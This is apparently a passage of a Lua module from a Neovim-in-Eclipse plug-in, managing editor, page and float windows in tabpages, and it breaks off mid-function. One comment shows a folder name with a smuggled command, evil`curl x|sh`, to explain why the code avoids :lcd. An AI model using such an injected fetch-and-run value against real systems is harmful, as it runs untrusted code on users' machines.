-- SPDX-FileCopyrightText: 2026 Jm6CnDDXBwFTakS
-- SPDX-License-Identifier: EPL-2.0

-- Installs the module `neovim4eclipse.windows`: a Neovim window per Eclipse editor, each alone in
-- its own tabpage (docs/design/WINDOWS.md; Java side `DocumentBuffers` and `EditorWindows`).
-- Argument: the home buffer's number. Returns the home window's id: the window the plug-in started
-- in, which shows a document when its editor has no window of its own, and is never closed by the
-- plug-in.
--
-- Why tabpages: one window per tab fills Neovim's screen, which is the attached editor's size
-- (VIEWPORT.md), so `H`, `L` and `Ctrl-D` match the editor, and window commands stay inside the
-- editor's tab. `'showtabline'` is set to 0, a setting the plug-in changes (docs/USER_GUIDE.md,
-- "Neovim settings the plug-in changes"): Neovim's default, 1, would show a tab line as soon as a
-- second editor has a window, and take a row from the editor.
--
-- The functions, each called by one of the short scripts in LuaScripts:
-- - `open(buf, folder)`: LuaScripts.OPEN_WINDOW.
-- - `show(win, buf)`: LuaScripts.SHOW_WINDOW.
-- - `travel(win, buf, line, col)`: LuaScripts.TRAVEL_WINDOW.
-- - `close(win, fallback)`: LuaScripts.CLOSE_WINDOW.
-- - `release(buf, fallback)`: LuaScripts.RELEASE_BUFFER.
-- - `home_buffer()`: LuaScripts.HOME_BUFFER; `close` and `release` use it too, for a fallback
--   buffer Neovim wiped.
-- - `is_side_window(win)`: whether a window is a floating or special one beside an editor's, where
--   `:q` is Neovim's (LuaScripts.WINDOW_COMMANDS).
--
-- Quietly means with `'eventignore'` set to `all`: what the plug-in does to a window that is not
-- the current one fires no autocommand, so Eclipse does not take it for something the user did.
-- Example: `nvim_win_set_buf` on a window of another tab enters it for a moment and fires
-- `BufEnter` (WINDOWS.md, E7), which Eclipse would follow as a jump.
--
-- The safety net: `WinClosed` sends `eclipse_window_closed(win)`, so that a window the user closed
-- in Neovim (`:tabclose`, a plug-in's `nvim_win_close`) is forgotten, and its editor gets a new one
-- at its next attach. The plug-in's own closes are quiet and do not send it. A home window closed
-- that way is opened again by the next `show` of it.
--
-- The second net, `WinNew`, closes a window Eclipse cannot show (a stray split, the quickfix
-- window) once the command that opened it is over; floats are left to `close_undrawn`
-- (LuaScripts.CLOSE_UNDRAWN_FLOAT). A changed buffer outlives that close, whatever its
-- `'bufhidden'`. Two kinds of window it hands to a page editor instead: a `:checkhealth` report's
-- and a help window (`:help`, `:helpgrep`). Their buffer stays, and `eclipse_view_page(kind, buf,
-- line)` asks Eclipse to show it in a page window of its own (`show_page`); the window it came in
-- closes, with no message (`docs/ARCHITECTURE.md`, decision 10). A window on a file (a picker's
-- split action) becomes an Eclipse split or editor tab on that file, at its cursor
-- (`take_file_window`).
--
-- Sent as LuaScripts.WINDOWS (core/LuaModules runs this file as a chunk of its own).

local M = {}
-- The module's state that changes as it runs, in one table rather than in locals, so
-- that every part of the module reads and sets the same value. Example: M.home() opens
-- the home window again when the user closed it, and every later close (closable)
-- compares with the new one.
local S = {
  -- The home buffer's number (the argument), made anew if Neovim wiped it (M.home_buffer).
  home_buf = tonumber((select(1, ...))),
  -- The home window: the one the plug-in started in (M.home opens it again if closed).
  home = vim.api.nvim_get_current_win(),
  -- The plug-in's float the current insert began in, or nil (InsertEnter below): leaving
  -- ends that insert (M.leave_float), not one begun elsewhere since.
  insert_float = nil,
  -- The float that had the keyboard as Neovim's start ended, before any editor was
  -- shown (M.close_start_floats): the first editor takes it along (settle_start_float).
  pending_start_float = nil,
  -- Whether Eclipse has shown an editor yet (M.show).
  editor_shown = false,
}
--- What to call a floating window in a message: its buffer's filetype ("lazy",
--- "TelescopePrompt"), else "a plug-in".
local function float_name(win)
  local ok, ft = pcall(function() return vim.bo[vim.api.nvim_win_get_buf(win)].filetype end)
  return ok and ft ~= '' and ft or 'a plug-in'
end
--- The message for a float Neovim would not close (close_float found it refused, as for a
--- changed buffer that would be wiped). Example: "Could not close the floating window of
--- lazy: it is hidden, and it would take the keys unseen".
function M.float_kept_message(name, why)
  return "Could not close the floating window of " .. name .. ": " .. why
end
--- The message for a floating window with the focus that the plug-in closed (M.close_undrawn,
--- M.close_start_floats): its name, and why. Example: "Closed the floating window of lazy: it
--- is hidden, and it would take the keys unseen".
function M.float_closed_message(name, why)
  return "Closed the floating window of " .. name .. ": " .. why
end
-- Why a float the editor does not draw is closed, after the reason it is not drawn.
local UNSEEN = ', and it would take the keys unseen'
-- Why a float with the focus that its plug-in hid is closed (M.close_undrawn).
local HIDDEN = 'it is hidden'
-- Why a float with the keyboard that the editor does not draw is closed as the start ends
-- (M.close_start_floats). On M too, for the tests that look for the message
-- (float_closed_message(name, M.AT_START)).
local AT_START = "it had the keyboard while Neovim started and the editor does not show it,"
  .. " so the keys typed meanwhile go to your file (its plug-in's command opens it again)"
M.AT_START = AT_START
-- The windows the plug-in opened and has not closed (the home window, the editors' and
-- the pages', these marked 'page'): any other plain window is a stray one (the WinNew
-- safety net below), and a floating or special one is a side window (M.is_side_window).
local own = { [S.home] = true }
-- Each page window's own buffer (M.open_page), which it keeps (M.restore_page).
local page_buf = {}
-- Each page window's kind: 'messages', 'help' or 'checkhealth' (M.open_page). It says
-- which buffers the window may change to: a help page follows Ctrl-] to another help
-- buffer (M.follow_page); every other change is put back.
local page_kind = {}
-- The windows the safety net has looked at, so that it knows a new one: only a new
-- window's :checkhealth report or help goes to a page editor (take_health_report,
-- take_help), never one the net saw before.
local seen = {}
for _, win in ipairs(vim.api.nvim_list_wins()) do
  seen[win] = true
end
-- The window each window was first entered from (WinEnter, by the WinNew net below);
-- one opened without entering it has none until it is entered. Kept per window, since
-- a check scheduled for an earlier window may be the one that finds a report.
local opened_from = {}
-- The editor's window the action behind each new window began in, through any window
-- the same action opened on the way. Example: fzf-lua's tab action on two files opens
-- the second tab page from the first, which is no editor's and is gone by the time the
-- net reaches the second, so it is worked out here, as each window opens.
local from_editor = {}
vim.o.showtabline = 0

--- Runs fn(...) without Neovim's file info message ('shortmess' F: putting a buffer in a
--- window gives one, as :b does, and two messages in a row would open Eclipse's output
--- popup; see SHOW_BUFFER), and returns its result. An error in fn is raised again once
--- 'shortmess' is back as it was.
local function without_file_info(fn, ...)
  local saved = vim.o.shortmess
  if not saved:find('F', 1, true) then
    vim.o.shortmess = saved .. 'F'
  end
  local ok, result = pcall(fn, ...)
  vim.o.shortmess = saved
  if not ok then
    error(result, 0)
  end
  return result
end

--- Runs fn(...) with every autocommand off ('eventignore' all) and without the file info
--- message, and returns its result.
local function quietly(fn, ...)
  local saved = vim.o.eventignore
  vim.o.eventignore = 'all'
  local ok, result = pcall(without_file_info, fn, ...)
  vim.o.eventignore = saved
  if not ok then
    error(result, 0)
  end
  return result
end

--- The home buffer's number: made anew, an unlisted scratch buffer as at start, if Neovim
--- wiped it (a plug-in's :bwipeout 2, its usual number, or one that wipes every buffer nvim_list_bufs() has),
--- and remembered, so that every later call and the home window agree on it. Eclipse
--- asks for it (HOME_BUFFER) when the home buffer it knows is gone.
function M.home_buffer()
  if not vim.api.nvim_buf_is_valid(S.home_buf) then
    S.home_buf = vim.api.nvim_create_buf(false, true)
  end
  return S.home_buf
end

--- The home window, opened again (quietly, in a new tab) if the user closed it.
function M.home()
  if not vim.api.nvim_win_is_valid(S.home) then
    local buf = M.home_buffer()
    S.home = quietly(function()
      return vim.api.nvim_tabpage_get_win(vim.api.nvim_open_tabpage(buf, false, {}))
    end)
    own[S.home] = true
  end
  return S.home
end

--- Shows buf in win without adding to win's jump history (:keepjumps). nvim_win_set_buf
--- and nvim_set_current_buf add a jump to the window they change, and the plug-in changes
--- windows behind the user's back: the window left behind by a travel got a jump each
--- time. With such stray jumps, Ctrl-O (and Ctrl-I) never ran out between two editors:
--- each found one more jump into the other file, and at the end of a window's history
--- Eclipse's Back (the fallback, SETUP) found the other editor again. Example: :e
--- other.txt, :e #, :e #, then Ctrl-O held down went back and forth for ever. The !
--- hides the buffer left even with changes, which live in Eclipse's document.
local function put_buf(win, buf)
  vim.api.nvim_win_call(win, function()
    vim.cmd('keepjumps buffer! ' .. buf)
  end)
end

--- Puts buf in win: as Neovim does it when win is current (BufEnter tells Eclipse), quietly if not.
local function set_buf(win, buf)
  if vim.api.nvim_win_get_buf(win) == buf then
    return
  end
  if win == vim.api.nvim_get_current_win() then
    without_file_info(put_buf, win, buf)
  else
    quietly(put_buf, win, buf)
  end
end

--- A window's folder, read by window and tabpage number: getcwd() inside nvim_win_call()
--- on a window of another tabpage answers with another window's folder (0.12.6).
local function folder_of(win)
  local at = vim.fn.win_id2tabwin(win)
  return vim.fn.getcwd(at[2], at[1])
end

--- Gives win a folder of its own (chdir(..., 'window'), never :lcd). Returns whether win
--- now works in folder, with a window-local folder. Silent, as chdir() is.
---
--- Why a folder with $ is refused: chdir() expands no backticks, wildcards or ~, so
--- nothing in a folder's name runs, but it does expand environment variables: a folder
--- named e$SHELL lands in e/bin/zsh (probed on 0.12.6), and DirChanged autocommands
--- would see that folder. With no $ in the name, chdir() lands in folder or, if it
--- fails, changes nothing; the check after it only says which. The cost: an editor on a
--- real folder with $ in its name keeps the folder it copied, as when chdir() fails.
---
--- Skipped only when win has a local folder that is folder already: a window with
--- none follows a later global :cd (example: Neovim's folder is the project's, the
--- window copies it without a local one, and a :cd /tmp in another editor moves it).
---
--- Paths are compared only by the one rule (PATHS, the first script the session
--- sends); without it nothing is changed and false is returned.
function M.set_folder(win, folder)
  local paths = package.loaded['neovim4eclipse.paths']
  if not paths or folder:find('$', 1, true) then
    return false
  end
  local at = vim.fn.win_id2tabwin(win)
  if vim.fn.haslocaldir(at[2], at[1]) == 1 and paths.same(folder_of(win), folder) then
    return true -- there already: no chdir(), so no DirChanged for nothing
  end
  vim.api.nvim_win_call(win, function()
    pcall(vim.fn.chdir, folder, 'window')
  end)
  return paths.same(folder_of(win), folder)
end

function M.open(buf, folder)
  if not vim.api.nvim_buf_is_valid(buf) then
    return -2 -- wiped in Neovim (:noautocmd bwipeout): Eclipse makes the buffer anew
  end
  -- Not entered: fires WinNew, TabNew, BufWinEnter and WinScrolled only (E7), so the
  -- user's BufWinEnter autocommands run, and Eclipse sees no switch. Without the file
  -- info putting the buffer in a window would give ('shortmess' F): Neovim shows it at
  -- its next redraw, for an editor the user opened in Eclipse.
  local win = vim.api.nvim_tabpage_get_win(without_file_info(vim.api.nvim_open_tabpage, buf, false, {}))
  own[win] = true
  vim.api.nvim_win_call(win, function()
    -- A new window copies the jump history of the current one (E7): another editor's
    -- jumps. Ctrl-O in a fresh editor then has nowhere to go, as in a fresh Vim window.
    vim.cmd('clearjumps')
    -- The folder once, here, so a :lcd the user types stays with the editor. Without
    -- one, the window keeps the folder it copied from the current window (the editor
    -- attached before, as a Vim window inherits it). With 'autochdir', Neovim moves to
    -- the file's folder on entering the window anyway (checked on 0.12.6).
    -- A folder that does not exist (yet: a new file in a missing folder, written with
    -- :w ++p) is skipped, keeping the copied one. Silent: Neovim echoes the new folder,
    -- a message that would replace the one the user is reading (the write message of
    -- the :w that just opened another editor, say).
    -- chdir(), not :lcd: a command's argument goes through file-name expansion, where
    -- `...` runs a shell command, so a project folder named evil`curl x|sh` would run it
    -- the moment one of its files opened. chdir() runs nothing and says nothing, but it
    -- expands $VAR, so M.set_folder refuses a folder with $ in its name.
  end)
  if folder ~= nil and folder ~= '' and not vim.o.autochdir and vim.fn.isdirectory(folder) == 1 then
    M.set_folder(win, folder)
  end
  return win
end

-- A page window's options, set when it opens: a new window copies the current window's
-- (an editor's number and sign columns, its 'list', its 'nowrap'), and a buffer shown
-- again takes those of the window it was last shown in; a page of text that no file has
-- wants neither. Set quietly, on the page's window only.
local PAGE_OPTIONS = {
  number = false, relativenumber = false, signcolumn = 'no', foldcolumn = '0',
  statuscolumn = '', list = false, wrap = true, spell = false, colorcolumn = '',
  foldenable = false,
}
-- The IDE keys a page gives back to Neovim (IDE_KEYS keeps what they were): gd, K, the
-- gr* keys and the like are about code, which a page is not. gt and gT stay Eclipse's:
-- they move among the editor tabs, the page's too.
local KEEP_IN_PAGES = { next_tab = true, previous_tab = true }

--- Gives the IDE keys of IDE_KEYS back to Neovim in buf, buffer-locally: the mapping each
--- had before the plug-in's (Neovim's own default for gr*), or the key itself without
--- mappings when it had none (gd, K). Example: gd in the messages page is Neovim's gd.
local function give_ide_keys_back(buf)
  local ide = package.loaded['neovim4eclipse.ide_keys']
  if not ide then
    return -- the IDE keys are off (vim.g.neovim4eclipse_ide_keys = 0), or not mapped yet
  end
  for _, key in ipairs(ide.keys) do
    if not KEEP_IN_PAGES[key.action] then
      for _, mode in ipairs(key.modes) do
        local before = ide.before[mode .. ' ' .. key.lhs]
        vim.api.nvim_buf_call(buf, function()
          if before then
            local local_map = vim.deepcopy(before)
            local_map.buffer = 1
            vim.fn.mapset(local_map)
          else
            vim.keymap.set(mode, key.lhs, key.lhs, { buffer = buf, remap = false, desc = 'Neovim (a page)' })
          end
        end)
      end
    end
  end
end

--- Makes buf fit to be a page, once per buffer: every write that runs autocommands is
--- refused with Vim's E382 (as PAGE_TEXT's own hooks do for the messages page, which
--- keeps those), and q closes the page editor (a q the user mapped for the buffer is
--- kept). For Neovim's own buffers a page shows: a help file (a real file, 'readonly'
--- and 'nomodifiable' already, but :w! or :w x would still write it) and a
--- :checkhealth report (a scratch buffer, written only under a name). Example: :w x in
--- the help editor gives E382, and nothing is written.
local function page_buffer(buf)
  if vim.b[buf].neovim4eclipse_page or vim.b[buf].neovim4eclipse_page_ready then
    return
  end
  vim.b[buf].neovim4eclipse_page_ready = true
  for _, event in ipairs({ 'BufWriteCmd', 'FileWriteCmd', 'FileAppendCmd' }) do
    vim.api.nvim_create_autocmd(event, {
      buffer = buf,
      callback = function()
        vim.api.nvim_echo({ { "E382: Cannot write, 'buftype' option is set" } }, true, { err = true })
      end,
    })
  end
  local own_q = vim.api.nvim_buf_call(buf, function()
    return vim.fn.maparg('q', 'n', false, true)
  end)
  if own_q.buffer ~= 1 then
    vim.keymap.set('n', 'q', '<Cmd>Eclipse quit<CR>', { buffer = buf, nowait = true, desc = 'Close the page editor' })
  end
end

--- Whether buf is an open document's buffer now: DOCUMENT_BUFFER marked it
--- (b:neovim4eclipse_file) and its hooks are on it. CLOSE_DOCUMENT_BUFFER removes the hooks
--- and keeps the mark, so a buffer whose editor closed is no document any more: its
--- help may be a page again.
function M.is_document(buf)
  if vim.b[buf].neovim4eclipse_file == nil then
    return false
  end
  local ok, hooks = pcall(vim.api.nvim_get_autocmds, { group = 'neovim4eclipse_document', buffer = buf })
  return ok and #hooks > 0
end

--- Gives a document's buffer back what :help took from it: :help on a help file that is
--- open in an editor reuses the document's buffer and makes it a help buffer, read-only,
--- unlisted, unchangeable, with 'tabstop' 8 and help's 'iskeyword' (its text, undo
--- history and marks stay: :help reads nothing from disk for a loaded buffer); the
--- editor's typing and Eclipse's own edits would then fail
--- in Neovim, and the two texts drift apart. Quietly (no OptionSet), and with a message
--- saying why no help page opened. Example: doc/myplug.txt open in an editor, then
--- :help myplug-tag: the editor keeps working, and the message names the file.
local function restore_document(buf)
  if not vim.api.nvim_buf_is_valid(buf) or not M.is_document(buf) then
    return
  end
  quietly(function()
    local bo = vim.bo[buf]
    bo.buftype, bo.readonly, bo.modifiable, bo.buflisted = 'acwrite', false, true, true
    -- :help also set 'tabstop' 8 and help's 'iskeyword': the document's own come back
    -- (Eclipse's tab width, SET_INDENTATION; the filetype's word characters,
    -- DOCUMENT_BUFFER), so block selections and w, * and ciw work as before.
    local ts, isk = vim.b[buf].neovim4eclipse_tabstop, vim.b[buf].neovim4eclipse_iskeyword
    if ts then
      bo.tabstop = ts
    end
    if isk then
      bo.iskeyword = isk
    end
  end)
end
local function give_document_back(buf)
  restore_document(buf)
  -- Again once the command is over: inside a help window (the Ctrl-] route, from
  -- BufEnter) Neovim sets help's 'iskeyword' after BufEnter.
  vim.schedule(function()
    restore_document(buf)
  end)
  -- After the command, not inside it: an error message from a BufEnter autocommand (the
  -- Ctrl-] route, follow_page) aborts the :help that fired it, with Neovim's "Error in
  -- BufEnter Autocommands" around it.
  local message = 'The help of ' .. vim.fn.fnamemodify(vim.api.nvim_buf_get_name(buf), ':t')
    .. ' is open in its editor: edit it there; the help editor shows it once that editor is closed'
  vim.schedule(function()
    vim.api.nvim_echo({ { message } }, true, { err = true })
  end)
end

--- Whether buf may be shown as a page of kind: the one check every way into a page window
--- passes (open_page, show_page, follow_page, the net's hand-over). Never an open
--- document's buffer (M.is_document): :help on a help file
--- that is open in an editor reuses the document's buffer and gives it 'buftype' help,
--- and as a page it would take the page's q, keys and write hooks into the code's
--- editor. A help page is a 'buftype' help buffer, a report a checkhealth scratch
--- buffer; messages are PAGE_TEXT's own buffer. Example: doc/myplug.txt open in an
--- editor, :help myplug-tag: refused as a page.
local function page_ok(buf, kind)
  if not vim.api.nvim_buf_is_valid(buf) or M.is_document(buf) then
    return false
  end
  if kind == 'help' then
    return vim.bo[buf].buftype == 'help'
  elseif kind == 'checkhealth' then
    return vim.bo[buf].filetype == 'checkhealth' and vim.bo[buf].buftype == 'nofile'
  end
  return true
end

--- A help page's window options, as Neovim's help ftplugin sets them in the window :help
--- opened (which the net closed): the stars of *tags* and the bars of |links| hidden.
local function help_options(win, kind)
  if kind == 'help' then
    vim.wo[win].conceallevel, vim.wo[win].concealcursor = 2, 'nc'
  end
end

--- Opens a window for a page (a page editor shown from this Neovim, not a file's) on buf,
--- alone in a tabpage of its own as an editor's is, and returns its id; -2 for a buffer
--- no longer there, or one that may not be a page of kind (page_ok). kind is
--- 'messages' (the default), 'help' or 'checkhealth'.
--- Quietly: its options are a page's, set here, not the look a user's
--- BufWinEnter gives a code editor's window ('colorcolumn', 'relativenumber'); the
--- user's WinEnter and BufEnter still run when the page takes the focus, as for any
--- window. Marked as the plug-in's, so the WinNew net leaves it, and :q in it is a host
--- command.
function M.open_page(buf, kind)
  if not page_ok(buf, kind or 'messages') then
    return -2
  end
  page_buffer(buf)
  local win = quietly(function()
    local w = vim.api.nvim_tabpage_get_win(vim.api.nvim_open_tabpage(buf, false, {}))
    vim.api.nvim_win_call(w, function()
      vim.cmd('clearjumps') -- the current window's jumps are another editor's
    end)
    -- Where PAGE_TEXT puts the cursor of the page's windows ("end": on the newest
    -- message): a window opened after the text was filled gets it too.
    if vim.b[buf].neovim4eclipse_page_cursor == 'end' then
      pcall(vim.api.nvim_win_set_cursor, w, { vim.api.nvim_buf_line_count(buf), 0 })
    end
    for name, value in pairs(PAGE_OPTIONS) do
      vim.wo[w][name] = value
    end
    help_options(w, kind)
    give_ide_keys_back(buf)
    return w
  end)
  own[win] = 'page'
  seen[win] = true
  page_buf[win] = buf
  page_kind[win] = kind or 'messages'
  return win
end

--- Whether win is a page's window (M.open_page).
function M.is_page(win)
  return own[win] == 'page'
end

--- Opens another page window like win: on the buffer it shows, of its kind (a :split of
--- the page: a second view, each with its own cursor). Returns { window, buffer }, or
--- { -1, -1 } when win is no page window.
function M.open_page_like(win)
  local buf = page_buf[win]
  if own[win] ~= 'page' or not buf or not vim.api.nvim_buf_is_valid(buf) then
    return { -1, -1 }
  end
  local second = M.open_page(buf, page_kind[win])
  pcall(vim.api.nvim_win_set_cursor, second, vim.api.nvim_win_get_cursor(win))
  return { second, buf }
end

--- Shows buf, a buffer of Neovim's own for page kind ('help': the page :help opened;
--- 'checkhealth': a report), in page window win with the cursor on line, the line at
--- the top as :help puts it; when win is no open page window, in a new one
--- (M.open_page). Returns the window, or -2 when buf is gone. A report the window showed
--- before is wiped when no window shows it any more: :checkhealth makes a new buffer
--- each time, and an old one would stay in :ls! for nothing. Old help buffers stay, as in
--- Vim (Ctrl-T and Ctrl-O go back to them). Example: :help options with the help editor
--- open: its window changes to options.txt, quietly, on the topic's line.
function M.show_page(win, buf, line, kind)
  if not page_ok(buf, kind) then
    return -2
  end
  if own[win] ~= 'page' or not vim.api.nvim_win_is_valid(win) then
    win = M.open_page(buf, kind)
  else
    local old = page_buf[win]
    page_buffer(buf)
    quietly(function()
      put_buf(win, buf)
      for name, value in pairs(PAGE_OPTIONS) do
        vim.wo[win][name] = value
      end
      help_options(win, kind)
    end)
    give_ide_keys_back(buf)
    page_buf[win] = buf
    page_kind[win] = kind
    if old and old ~= buf and vim.api.nvim_buf_is_valid(old) and vim.bo[old].filetype == 'checkhealth'
        and #vim.fn.win_findbuf(old) == 0 then
      pcall(vim.api.nvim_buf_delete, old, { force = true })
    end
  end
  if win > 0 then
    local last = vim.api.nvim_buf_line_count(buf)
    line = math.max(1, math.min(line, last))
    vim.api.nvim_win_call(win, function()
      vim.fn.winrestview({ lnum = line, col = 0, topline = line })
    end)
  end
  return win
end

--- Called on each BufEnter (SETUP): when a help page's window now shows another help
--- buffer, put there by Neovim's help itself (Ctrl-], :help typed in it, Ctrl-T,
--- :cnext through a :helpgrep), that buffer becomes the page's, as Vim's help window
--- goes from page to page. Returns whether it did; Eclipse then counts it as the
--- page's too (DocumentBuffers.onEntered). Any other buffer in a page window is put
--- back (M.restore_page). Example: Ctrl-] on |options| in the help editor:
--- options.txt is the page now.
function M.follow_page(win, buf)
  if own[win] ~= 'page' or page_kind[win] ~= 'help' or page_buf[win] == buf then
    return false
  end
  if vim.api.nvim_buf_is_valid(buf) and M.is_document(buf) and vim.bo[buf].buftype == 'help' then
    give_document_back(buf) -- Ctrl-] to it: the page gets its own buffer back (restore_page)
    return false
  end
  if not page_ok(buf, 'help') then
    return false
  end
  page_buf[win] = buf
  page_buffer(buf)
  give_ide_keys_back(buf)
  return true
end

--- Puts a page window's own buffer back into it, quietly and without a jump, after Neovim
--- put another one there (gf on a path in the page, :b 3): a page shows only its text,
--- and Eclipse opens the other buffer's file in an editor of its own. Returns the page's
--- buffer, or -1 when win is no open page window (or its buffer is gone).
function M.restore_page(win)
  local buf = page_buf[win]
  if not buf or not vim.api.nvim_win_is_valid(win) or not vim.api.nvim_buf_is_valid(buf) then
    return -1
  end
  if vim.api.nvim_win_get_buf(win) ~= buf then
    quietly(put_buf, win, buf)
  end
  return buf
end

--- Whether Neovim is in an insert, or in the one command of Ctrl-O inside one ('niI'), after
--- which the insert would go on.
local function in_insert()
  local mode = vim.api.nvim_get_mode().mode
  return mode:match('^[iR]') ~= nil or mode:match('^ni') ~= nil
end

--- Ends an insert that a plug-in carried out of its float, keeping the cursor of the window
--- Neovim is in now. For Eclipse's own routes the insert has ended already, in the float
--- (M.end_float_insert); this is what is left for a float that moved Neovim itself.
--- :stopinsert takes effect once the running call is over, in that window, and Esc moves the
--- cursor a column left there: it is put back as the insert ends, so the editor's caret
--- stays. Until then the cursor waits on the next character that is not white space, or
--- an empty line: an insert that has only auto-indented ('o' in the float, nothing typed)
--- ends by removing the white space at the cursor of the window Neovim is in, here the
--- document's. Example: 'o' in a float whose plug-in then enters the editor's window, the
--- document's cursor at the start of "    keep": the cursor waits on the k, and the line
--- keeps its indentation. A document of only white space has no such place: its line
--- loses that white space (Eclipse's routes do not come here, M.end_float_insert).
--- After Ctrl-O no Esc comes and no indent is left, so there is nothing to put back.
local function stop_insert_in_place()
  if vim.api.nvim_get_mode().mode:match('^ni') then
    vim.cmd.stopinsert()
    return
  end
  local landed = vim.api.nvim_get_current_win()
  local at = vim.api.nvim_win_get_cursor(landed)
  local safe = vim.fn.searchpos([[\S\|^$]], 'cnw')
  if safe[1] > 0 then
    pcall(vim.api.nvim_win_set_cursor, landed, { safe[1], safe[2] - 1 })
  end
  vim.api.nvim_create_autocmd('ModeChanged', { once = true, pattern = '[iR]*:*', callback = function()
    if vim.api.nvim_win_is_valid(landed) and vim.api.nvim_get_current_win() == landed then
      pcall(vim.api.nvim_win_set_cursor, landed, at)
    end
  end })
  vim.cmd.stopinsert()
end

--- Says that a float was closed, or refused to close, as the start ended. Once the caller
--- is over (vim.schedule): an error message from inside UIEnter gets Neovim's "Error in
--- UIEnter Autocommands for "*":" above it, as if the check had failed. Said as an error
--- still, as the other closes are (and ui2 shows a long one in full).
local function say_at_start(message)
  vim.schedule(function()
    vim.api.nvim_echo({ { message } }, true, { err = true })
  end)
end

--- The first editor is shown in win: the float waiting for it gets the keyboard, as it
--- has in a terminal, if the editor draws it now (M.bring_start_floats brought it to win's
--- tab page; one hanging on a window or the cursor stays behind). If not, it is closed,
--- not by force, with a message: keys go only to a window Eclipse draws.
local function settle_start_float(win)
  local float = S.pending_start_float
  S.pending_start_float = nil
  if not float then
    return
  end
  local there = vim.api.nvim_win_is_valid(float) and M.focused_float(float)
  if there and not vim.api.nvim_win_get_config(float).hide
      and vim.api.nvim_win_get_tabpage(float) == vim.api.nvim_win_get_tabpage(win)
      and pcall(vim.api.nvim_set_current_win, float)
      and vim.api.nvim_get_current_win() == float then
    return
  end
  if there then
    local name = float_name(float)
    if pcall(vim.api.nvim_win_close, float, false) then
      say_at_start(M.float_closed_message(name, AT_START))
    else
      say_at_start(M.float_kept_message(name, AT_START))
    end
  end
end

--- Whether M.show enters a window for win and buf: buf still there (a plug-in's :bwipeout
--- wipes it), and win the home window (-1) or a window still there.
local function shows(win, buf)
  return vim.api.nvim_buf_is_valid(buf) and (win < 0 or vim.api.nvim_win_is_valid(win))
end

function M.show(win, buf)
  if not shows(win, buf) then
    -- -2: wiped in Neovim, Eclipse shows the home buffer; -1: closed in Neovim, Eclipse
    -- opens a new one
    return vim.api.nvim_buf_is_valid(buf) and -1 or -2
  end
  if win < 0 then
    win = M.home()
  end
  local current = vim.api.nvim_get_current_win()
  set_buf(win, buf)
  if win ~= current then
    vim.api.nvim_set_current_win(win) -- BufEnter, with the buffer Eclipse expects
  end
  S.editor_shown = true
  -- After entering win: a float moved while current would take Neovim back to its tab page.
  M.bring_start_floats(win, vim.v.vim_did_enter ~= 1 or S.pending_start_float ~= nil)
  settle_start_float(win)
  -- One check, where every show ends, from Neovim's state: in the editor's window, an insert
  -- begun in a float (any float, the one waiting or not, closed or left) ends here, or
  -- the keys meant for it would be typed into the document.
  if S.insert_float ~= nil and vim.api.nvim_get_current_win() == win and in_insert() then
    stop_insert_in_place()
  end
  return win
end

function M.travel(win, buf, line, col)
  quietly(function()
    put_buf(win, buf) -- no jump in the window left behind (see put_buf)
    local last = vim.api.nvim_buf_line_count(buf)
    pcall(vim.api.nvim_win_set_cursor, win, { math.max(1, math.min(line, last)), math.max(0, col) })
  end)
end

--- The buffer the home window shows instead of one being closed: fallback, which Eclipse
--- names (the attached buffer, or the home buffer), or the home buffer, made anew if need
--- be, when Neovim wiped fallback. The one rule for every close (M.close, M.release), so
--- that none puts a wiped buffer in a window. Example: a plug-in ran :bwipeout 2, the
--- home buffer Eclipse still names; closing the active editor shows a new home buffer
--- instead of failing with E86 (or leaving Neovim's own choice in the home window).
local function fallback_buf(fallback)
  return vim.api.nvim_buf_is_valid(fallback) and fallback or M.home_buffer()
end

--- Leaves win (quietly) for the home window showing fallback, if win is the current one.
local function leave(win, fallback)
  if win == vim.api.nvim_get_current_win() then
    local to = M.home()
    quietly(function()
      vim.api.nvim_set_current_win(to)
      put_buf(to, fallback_buf(fallback))
    end)
  end
end

--- Whether Neovim is in a plug-in's float in the tab page of win, an editor's window it is
--- not in: the float that closing win leaves first (leave_float_of), and so the one whose
--- insert ends first (M.end_float_insert). Example: Telescope's prompt open over editor A,
--- A closing: true; B closing in the background: false, the prompt keeps its insert.
local function in_float_of(win)
  local current = vim.api.nvim_get_current_win()
  return current ~= win and M.focused_float(current)
    and vim.api.nvim_win_get_tabpage(current) == vim.api.nvim_win_get_tabpage(win)
end

--- Whether win is an editor's window that M.close and M.release close: still there, and
--- not the home window, which is never closed (it shows another buffer instead).
local function closable(win)
  return vim.api.nvim_win_is_valid(win) and win ~= S.home
end

--- Whether closing win (M.close, M.release) takes Neovim out of the plug-in's float it is
--- in: a float in win's tab page, left first (leave_float_of), or win itself, a float on
--- the buffer being released, left for the home window (leave). Example: an insert in a
--- peek float on b.txt, b.txt's editor closing in the background: true, so that the
--- insert ends in the float and does not go on in the home window's document.
local function closing_leaves_float(win)
  local current = vim.api.nvim_get_current_win()
  return closable(win) and (in_float_of(win) or (win == current and M.focused_float(win)))
end

--- Before win, an editor's window, closes: a plug-in's float with the cursor in win's tab
--- page is left first (M.leave_float), closed as Eclipse mode closes one, so that its insert
--- ends and its plug-in cleans up (Telescope's BufLeave). Closing the tab quietly would
--- close the float with it, and Neovim would go on in insert mode in another window.
--- Example: Telescope's prompt open in editor A, the user closes A; the next keys are
--- normal-mode keys in editor B. And a float on a file with unsaved changes that the tab's
--- close takes along keeps its buffer, hidden, whatever 'hidden' and 'bufhidden' say.
local function leave_float_of(win)
  local tab = vim.api.nvim_win_get_tabpage(win)
  if in_float_of(win) then
    M.leave_float()
  end
  -- A float leaving could not close (close_float: Neovim refused, closing would unload
  -- or wipe a file's unsaved changes) closes with the tab page now: its buffer is kept,
  -- hidden ('bufhidden' hide), so that the changes stay (:ls), as leaving promised.
  for _, w in ipairs(vim.api.nvim_tabpage_list_wins(tab)) do
    local buf = vim.api.nvim_win_get_buf(w)
    if not own[w] and vim.api.nvim_win_get_config(w).relative ~= ''
        and vim.bo[buf].buftype == '' and vim.bo[buf].modified then
      vim.bo[buf].bufhidden = 'hide'
    end
  end
end

--- Closes an editor's window quietly. It is forgotten here too: being quiet, the close
--- fires no WinClosed, which would.
local function close_quietly(win)
  quietly(vim.api.nvim_win_close, win, true)
  own[win] = nil
  page_buf[win] = nil
  page_kind[win] = nil
  seen[win] = nil -- no WinClosed while quiet
end

function M.close(win, fallback)
  if closable(win) then
    leave_float_of(win)
    leave(win, fallback)
    close_quietly(win)
  end
  return { M.home(), M.home_buffer() }
end

function M.release(buf, fallback)
  local closed = {}
  for _, win in ipairs(vim.fn.win_findbuf(buf)) do
    if win == S.home then
      set_buf(win, fallback_buf(fallback))
